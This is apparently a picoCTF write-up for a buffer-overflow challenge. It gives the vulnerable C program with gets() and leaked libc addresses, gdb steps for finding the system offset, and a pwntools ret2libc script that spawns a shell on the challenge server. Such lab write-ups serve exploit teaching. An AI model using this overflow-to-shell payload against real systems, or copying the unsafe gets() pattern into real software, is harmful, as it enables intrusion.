Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
```

<br/>

Let's connect with ssh

```bash
$ ssh campeon33@2018shell4.picoctf.com
$ cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee
```

<br/>

Let's start by finding the offset

```bash
$ gdb vuln
(gdb) break main
(gdb) r
(gdb) p puts
$1 = {<text variable, no debug info>} 0xf7641150 <puts>
(gdb) p system
$2 = {<text variable, no debug info>} 0xf761c950 <system>
(gdb) p 0xf7641150 - 0xf761c950
$3 = 149504
```
The the offset is puts - system, that equals = 149504

<br/>

The system address is puts address - offset


<br/>

With this we can make the exploit

```python
from pwn import * 
import paramiko
                                       
user = 'youruser' 
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee && ./vuln')

p.recvuntil("puts: ")
puts_addr = int(p.recvline(),16)

p.recvuntil("flush")
flush_addr = int(p.recvline(),16)

p.recvuntil("read:")
read_addr = int(p.recvline(),16)

p.recvuntil("write:")
write_addr = int(p.recvline(),16)

p.recvuntil("useful_string: ")
binsh = int(p.recvline(),16)


# p puts - system
offset = 149504
sys_addr = puts_addr - offset
padding = b'A'*160
payload = padding
payload += p32(sys_addr)
payload += b'bbbb'
payload += p32(binsh)


p.recvuntil("Enter a string:")
p.sendline(payload)
p.interactive()
```
